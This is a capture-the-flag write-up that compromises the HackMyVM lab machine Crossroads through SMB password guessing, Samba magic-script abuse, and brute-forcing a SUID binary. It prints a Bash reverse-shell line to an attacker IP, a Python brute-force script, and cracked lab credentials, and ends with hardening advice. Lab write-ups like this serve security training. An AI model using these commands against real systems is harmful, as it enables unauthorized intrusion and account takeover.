# HackMyVM - Crossroads (Easy)

## Introduction

Today we are solving another Linux-based **HackMyVM** machine named **Crossroads**, which is rated as an **Easy** challenge. Unlike many other HackMyVM machines, this one does not reveal its IP address on the machine banner, so our first objective is identifying the target on the local network.

This machine demonstrates several practical penetration testing concepts including network discovery, SMB enumeration, WordPress reconnaissance, credential attacks against SMB services, abuse of Samba's **magic script** functionality, and privilege escalation through a custom SUID binary. Although each individual vulnerability may appear simple, chaining them together leads to full system compromise.

As always, we begin with reconnaissance.

---

# Network Discovery

Since the target IP address is not provided, the first step is discovering active hosts on the local network.

A simple and effective tool for this is **Netdiscover**, which listens for ARP traffic and identifies live hosts on the current subnet.

```bash
netdiscover -i eth1
```

> Replace `eth1` with your own network interface if it differs.

The scan discovers several hosts.

```
192.168.56.1
192.168.56.100
192.168.56.132
```

Among these, **192.168.56.132** is identified as our target machine.

With the target identified, the next step is to determine which services are exposed.

---

# Port Scanning

Rather than scanning only the most common ports, we begin with a full TCP port scan to ensure that no hidden services are overlooked.

```bash
nmap -p- --min-rate 5000 192.168.56.132
```

The scan reveals three open ports.

```
80/tcp   HTTP
139/tcp  NetBIOS
445/tcp  SMB
```

This immediately tells us that the machine exposes both a web server and SMB file sharing services.

Because both services commonly contain valuable attack vectors, they will become the primary focus of our enumeration.

To gather additional information, we perform a version and default script scan.

```bash
nmap -sC -sV 192.168.56.132
```

The results provide significantly more information.

```
80/tcp  Apache httpd 2.4.38 (Debian)

139/tcp Samba

445/tcp Samba 4.9.5-Debian
```

Additional information discovered during the scan includes:

- Apache 2.4.38 running on Debian.
- Samba version 4.9.5.
- Hostname **CROSSROADS**.
- Workgroup **WORKGROUP**.
- HTTP robots.txt file present.
- SMB signing enabled but not required.

One particularly interesting finding is the robots.txt entry.

```
Disallow: /crossroads.png
```

Although this does not immediately reveal sensitive information, every hidden resource deserves investigation during a penetration test.

---

# SMB Enumeration

Since SMB services are exposed on ports **139** and **445**, we begin by gathering as much information as possible before attempting authentication.

One of the most useful enumeration tools for Samba environments is **enum4linux**.

```bash
enum4linux 192.168.56.132
```

The enumeration reveals several useful pieces of information.

Most importantly, it identifies a valid local username.

```
albert
```

Finding valid usernames during enumeration is extremely valuable because they can later be used for authentication attacks or password guessing.

The scan also lists the available SMB shares.

```
print$
smbshare
IPC$
```

Among these, the **smbshare** share immediately attracts attention because it appears to be a normal writable file share rather than a system-generated administrative share.

The server information also confirms that the host belongs to the **WORKGROUP** workgroup and is running Samba.

At this stage we attempt to connect anonymously using **smbclient**.

```bash
smbclient -L //192.168.56.132/
```

However, anonymous access is denied.

This indicates that authentication will likely be required before accessing the shared resources.

Instead of blindly attacking SMB, we temporarily shift our attention toward the web application while keeping the discovered username in mind.

---

# Web Enumeration

Opening the website on port **80** displays what appears to be the homepage for a treatment center.

```
12 Step Treatment Center | Crossroads Centre Antigua
```

Nothing immediately appears vulnerable.

The website loads normally and there are no obvious administrative interfaces exposed from the homepage.

To observe all HTTP requests and responses more closely, Burp Suite is configured as the browser proxy.

This allows every request made by the application to be inspected while browsing the site and can reveal hidden endpoints or parameters that may otherwise go unnoticed.

Although no immediate vulnerabilities are identified, further enumeration is still necessary.

---

# Directory Enumeration

After manually inspecting the website, the next logical step is directory brute forcing.

Enumerating hidden directories often reveals backup files, administrative panels, development resources, or forgotten content that is not linked from the homepage.

During this process we discover the application's **robots.txt** file.

Opening the file reveals:

```
User-agent: *
Disallow: /crossroads.png
```

Unlike many robots.txt files that expose multiple directories, this one references only a single image.

Naturally, we inspect the image in case it contains hidden information such as metadata, steganographic content, or embedded credentials.

However, the image itself does not provide any immediately useful information.

At this point, both manual web enumeration and robots.txt inspection have failed to reveal an initial foothold.

---

# Revisiting SMB

Since the web application has produced very few attack vectors, attention returns to the SMB service.

Earlier enumeration already provided an important clue.

```
Username: albert
```

Instead of attempting anonymous authentication again, we now perform a password attack using the known username.

Because we already possess a valid account name, an online password guessing attack becomes a practical next step.

For this purpose, **Medusa** is used against the SMB service.

```bash
medusa -h 192.168.56.132 -u albert -P <wordlist> -M smbnt
```

After a short period, Medusa successfully discovers valid credentials.

```
Username : albert
Password : bradley1
```

This demonstrates another common security weakness—using weak or easily guessable passwords for network services.

With valid credentials now available, we can authenticate directly to the SMB share and begin exploring the files accessible to the user.

At this stage, we have successfully completed the reconnaissance phase and obtained our first valid set of credentials. The next objective will be leveraging SMB access to gain code execution on the target system.

# Initial Access

With valid SMB credentials successfully obtained, the next objective is determining what resources the **albert** user can access.

Since the previous enumeration identified an interesting share named **smbshare**, we authenticate using the credentials recovered from the password attack.

```bash
smbclient //192.168.56.132/smbshare -U albert
```

After entering the password:

```
bradley1
```

authentication succeeds and we gain access to the share.

Unlike anonymous access, the authenticated session exposes several files that are immediately interesting.

```
user.txt
smb.conf
```

Both files deserve inspection because one contains the user flag while the other may reveal the Samba server configuration.

---

# Obtaining the User Flag

The first file we inspect is **user.txt**.

```bash
get user.txt
```

After downloading the file to our attacking machine, we read its contents.

```bash
cat user.txt
```

Output:

```
912D12370BBCEA67BF28B03BCB9AA13F
```

With this, the user flag has already been obtained.

However, our primary objective remains gaining code execution on the target system.

The next file proves to be significantly more valuable.

---

# Analyzing the Samba Configuration

The second file available inside the share is **smb.conf**.

Configuration files frequently reveal hidden functionality, authentication settings, writable directories, or custom features that can be abused.

Reading the configuration reveals the following share definition.

```
path = /home/albert/smbshare
valid users = albert
browsable = yes
writable = yes
read only = no
magic script = smbscript.sh
guest ok = no
```

Several options immediately stand out.

```
writable = yes
```

This confirms that authenticated users can upload files to the share.

More importantly, another directive appears.

```
magic script = smbscript.sh
```

This is an uncommon Samba feature that deserves attention.

---

# Understanding the Magic Script Feature

The **magic script** option is a legacy Samba feature that automatically executes a specific script whenever that file is uploaded to the shared directory.

In this case, Samba has been configured to execute:

```
smbscript.sh
```

This means that if we replace the existing script with our own malicious version, the Samba server will execute it automatically.

Since the script executes on the target machine, it becomes an excellent opportunity to obtain remote code execution.

Instead of uploading arbitrary files and hoping they execute, we now know exactly which filename the server expects.

---

# Preparing the Reverse Shell

We create a new file named:

```
smbscript.sh
```

Inside the file we place a simple Bash reverse shell.

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.106/4444 0>&1
```

The IP address should be replaced with the IP address of the attacking machine.

Before uploading the script, we prepare a listener to receive the incoming connection.

```bash
nc -lvnp 4444
```

The listener waits for any incoming connection on port **4444**.

---

# Triggering Remote Code Execution

With the payload prepared, we reconnect to the SMB share.

```bash
smbclient //192.168.56.132/smbshare -U albert
```

Inside the SMB session, we upload the malicious script.

```bash
put smbscript.sh
```

During the upload, Samba reports:

```
NT_STATUS_IO_TIMEOUT closing remote file \smbscript.sh
```

At first glance this appears to be an error.

However, this behavior is actually expected.

The timeout occurs because Samba immediately executes the uploaded script instead of simply storing it on disk.

As soon as execution begins, our Netcat listener receives an incoming connection.

```
Listening on 0.0.0.0 4444

Connection received from 192.168.56.132
```

We now have an interactive shell on the target.

Running:

```bash
whoami
```

confirms our current privileges.

```
albert
```

This is a much stronger foothold than simply accessing SMB files because we now possess command execution directly on the operating system.

---

# Shell Stabilization

Although the reverse shell works, it lacks many interactive terminal features.

Commands such as **Ctrl+C**, **Tab Completion**, editors, and terminal-based applications do not function correctly.

To improve the shell, we first verify that Python is installed.

```bash
which python3
```

Output:

```
/usr/bin/python3
```

Since Python is available, we spawn a proper pseudo-terminal.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The shell becomes slightly more interactive, but additional improvements are still required.

We suspend the shell locally using:

```
Ctrl + Z
```

Back on our attacking machine we configure the terminal.

```bash
stty raw -echo
fg
```

Returning to the remote shell, we restore terminal functionality.

```bash
export TERM=xterm
```

The shell now behaves much more like a normal SSH session.

Features such as command history, screen clearing, and interactive programs become significantly easier to use.

This stabilization step is always recommended after obtaining a reverse shell because it greatly improves the post-exploitation experience.

---

# Beginning Local Enumeration

With an interactive shell established as **albert**, the next phase is privilege escalation.

Rather than immediately searching for exploits, we begin with systematic local enumeration.

During this process, an unusual binary named **beroot** attracts attention.

Unlike common Linux utilities, this executable is not part of the operating system.

Because custom binaries frequently contain logic errors or insecure implementations, they often become excellent privilege escalation targets.

Inspecting the binary confirms that it is a **64-bit SUID executable**, meaning it executes with elevated privileges regardless of the user launching it.

The presence of a custom SUID binary immediately becomes our primary focus.

Instead of exploiting standard Linux misconfigurations, the remainder of the machine revolves around understanding how this binary works and identifying a way to abuse its functionality to obtain root access.

# Privilege Escalation

After obtaining a stable shell as the **albert** user, the next objective is escalating privileges to **root**.

During local enumeration, a custom executable named **beroot** was discovered. Unlike common Linux SUID binaries, this executable appeared to be a custom program created specifically for the challenge.

To better understand what we were dealing with, we first inspected the binary.

```bash
file /home/albert/beroot
```

The output confirmed that it was a **64-bit SUID ELF executable**.

The SUID bit immediately makes custom binaries high-value targets because they execute with the permissions of their owner rather than the user running them. If the program contains insecure logic, it can often be abused to gain elevated privileges.

Instead of blindly executing the binary, the next step was understanding how it behaved.

---

# Understanding the Binary

Executing the binary manually presented a password prompt.

```
enter password for root
-----------------------
```

Entering random passwords simply resulted in an authentication failure.

At this stage there were two possible approaches:

- Reverse engineer the binary using tools such as Ghidra or IDA.
- Treat it as a black box and attempt to discover the expected password through automation.

For this machine, the second approach proved to be sufficient.

Because the binary simply accepted a password through standard input, it became an ideal candidate for an automated brute-force attack.

---

# Automating the Password Attack

Rather than manually entering passwords, a small Python script was written to automate the process.

The script repeatedly launches the **beroot** binary, supplies one password from a wordlist through standard input, captures the program's output, and checks whether authentication succeeds.

```python
import subprocess
import sys

binary_path = "/home/albert/beroot"
wordlist_path = "rock_1m.txt"

def brute_force():
    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            print(f"[*] Starting brute force using {wordlist_path}...")

            count = 0

            for line in f:
                password = line.strip()

                if not password:
                    continue

                proc = subprocess.Popen(
                    [binary_path],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )

                stdout, stderr = proc.communicate(input=password)

                if "wrong" not in stdout.lower() and "wrong" not in stderr.lower():
                    print(f"\n[+] PASSWORD FOUND: {password}")
                    print(stdout)
                    return

                count += 1

    except KeyboardInterrupt:
        print("Interrupted")

if __name__ == "__main__":
    brute_force()
```

The script continuously tests passwords until the binary no longer returns the word **wrong**, indicating successful authentication.

---

# Preparing the Wordlist

Using the entire RockYou wordlist would unnecessarily increase execution time.

Instead, the first one million passwords were extracted into a smaller file.

```bash
head -n 1000000 /usr/share/wordlists/rockyou.txt > rock_1m.txt
```

This significantly reduces the search space while still covering many commonly used passwords.

Once both the script and the wordlist were ready, the brute-force process was started.

```bash
python3 brute.py
```

After some time, the script successfully discovered the correct password accepted by the custom binary.

Once authenticated, the binary displayed an unexpected message.

```
do ls and find root creds
```

Rather than spawning a root shell directly, the binary hinted that credentials had been stored somewhere on the filesystem.

This changed the objective from password cracking to file discovery.

---

# Discovering Root Credentials

To locate the hinted file, we searched the entire filesystem.

```bash
find / -type f -name "rootcreds" 2>/dev/null
```

The search returned:

```
/home/albert/rootcreds
```

Reading the file revealed the root account credentials.

```bash
cat /home/albert/rootcreds
```

Output:

```
root
___drifting___
```

The file contained both the username and the root password in plain text.

Although storing credentials in plaintext is never recommended in real environments, this was the intended privilege escalation path for the challenge.

---

# Switching to Root

With valid credentials now available, privilege escalation became straightforward.

We switched directly to the root account.

```bash
su root
```

After entering the recovered password:

```
___drifting___
```

authentication succeeded immediately.

Verifying our privileges confirms complete system compromise.

```bash
whoami
```

Output:

```
root
```

Finally, the root flag can be retrieved.

```bash
cat /root/root.txt
```

Output:

```
876F96716C3606B09A89F0FA3C1D52EB
```

At this point the machine has been fully compromised.

---

# Attack Chain Summary

The complete attack path for this machine was:

1. Discovered the target IP address using **Netdiscover**.
2. Enumerated open services with **Nmap**.
3. Identified Apache and Samba services.
4. Enumerated SMB using **enum4linux**.
5. Discovered the valid username **albert**.
6. Performed an SMB password attack using **Medusa**.
7. Recovered valid credentials:
   - **Username:** `albert`
   - **Password:** `bradley1`
8. Authenticated to the writable SMB share.
9. Downloaded `user.txt` and `smb.conf`.
10. Identified the **magic script** configuration inside Samba.
11. Uploaded a malicious `smbscript.sh` reverse shell.
12. Received a reverse shell as **albert**.
13. Stabilized the shell using Python PTY and terminal adjustments.
14. Identified the custom SUID binary **beroot**.
15. Automated password brute forcing with a Python script.
16. Recovered the location of stored root credentials.
17. Retrieved the plaintext root password.
18. Switched to the root account using `su`.
19. Captured the root flag.

---

# Security Recommendations

This machine highlights several security weaknesses that should be avoided in real-world environments.

- Use strong passwords for SMB accounts and disable weak password authentication policies.
- Implement account lockout mechanisms to reduce the effectiveness of online password attacks.
- Disable legacy Samba features such as **magic script**, as they can directly lead to remote code execution.
- Limit write permissions on shared directories to only those who absolutely require them.
- Carefully review custom SUID binaries for insecure authentication mechanisms or hardcoded logic before deployment.
- Never store privileged credentials in plaintext files.
- Periodically audit SUID binaries using tools such as **LinPEAS**, **Lynis**, or manual security reviews.
- Apply the principle of least privilege so that even if one account is compromised, attackers cannot easily move toward full system compromise.

---

# Conclusion - Jai Shri Ram

Crossroads is an enjoyable Easy-rated HackMyVM machine that combines realistic network enumeration with practical Linux privilege escalation techniques. The challenge emphasizes the importance of thorough reconnaissance, showing how seemingly minor findings—such as a valid SMB username or a writable share—can eventually lead to complete system compromise.

The most interesting aspect of the machine is the abuse of Samba's **magic script** functionality to gain initial code execution, followed by the analysis of a custom SUID binary to recover root credentials. Rather than relying on a single critical vulnerability, the machine demonstrates how chaining together multiple weaknesses can be just as effective.

Overall, Crossroads is an excellent lab for practicing SMB enumeration, credential attacks, post-exploitation methodology, shell stabilization, and the analysis of custom privileged binaries while reinforcing the importance of systematic enumeration throughout every stage of a penetration test.

